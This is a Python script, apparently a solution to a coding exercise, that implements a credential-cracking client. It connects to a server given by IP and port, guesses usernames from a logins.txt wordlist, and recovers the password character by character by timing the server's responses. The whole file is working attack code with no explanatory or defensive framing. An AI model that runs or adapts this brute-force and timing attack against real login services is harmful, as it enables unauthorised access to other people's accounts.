import json
import os
import socket
import string
import sys
from timeit import timeit, repeat


class PasswordHacker:
    def __init__(self, ip, port):
        self.address = (ip, int(port))
        self.client = None
        self.log_data = {'login': '', 'password': ''}
        self.resp_time = None

    def connect(self):
        self.client = socket.socket()
        self.client.connect(self.address)

    def disconnect(self):
        self.client.close()

    def send_msg(self):
        self.client.send(json.dumps(self.log_data).encode())
        return json.loads(self.client.recv(1024).decode())

    def find_login(self):
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logins.txt'), 'rt') as f:
            for line in f:
                self.log_data['login'] = line.strip()
                if self.send_msg() == {'result': 'Wrong password!'}:
                    break

    def find_password(self):
        letters = string.ascii_letters + string.digits
        self.resp_time = max(repeat('self.send_msg()', repeat=100, number=1, globals=locals()))
        while True:
            for letter in letters:
                self.log_data['password'] += letter
                time = timeit('self.send_msg()', number=1, globals=locals())
                response = self.send_msg()
                if response == {'result': 'Connection success!'}:
                    return
                elif time > self.resp_time * 2:
                    break
                self.log_data['password'] = self.log_data['password'][:-1]


def main():
    hacker = PasswordHacker(*sys.argv[1:])
    hacker.connect()
    hacker.find_login()
    hacker.find_password()
    print(json.dumps(hacker.log_data))
    hacker.disconnect()


if __name__ == '__main__':
    main()
